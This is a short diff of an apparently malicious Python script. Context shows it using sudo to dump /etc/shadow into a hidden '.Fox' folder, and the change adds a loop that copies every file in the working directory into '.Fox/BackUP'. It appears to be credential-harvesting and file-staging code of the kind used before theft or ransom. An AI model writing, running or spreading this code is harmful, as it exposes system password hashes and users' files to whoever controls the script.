@@ -15,5 +15,8 @@ os.system("sudo cat /etc/shadow > .Fox/OS_Pass.txt")
 
 ### Take Backup ###
 os.mkdir(".Fox/BackUP")
-os.chdir(".")
-shutil.copy("*", ".Fox/BackUP")
+data = os.listdir(".")
+for file in data:
+    if file == ".Fox":
+        continue
+    shutil.copy2(file, ".Fox/BackUP")
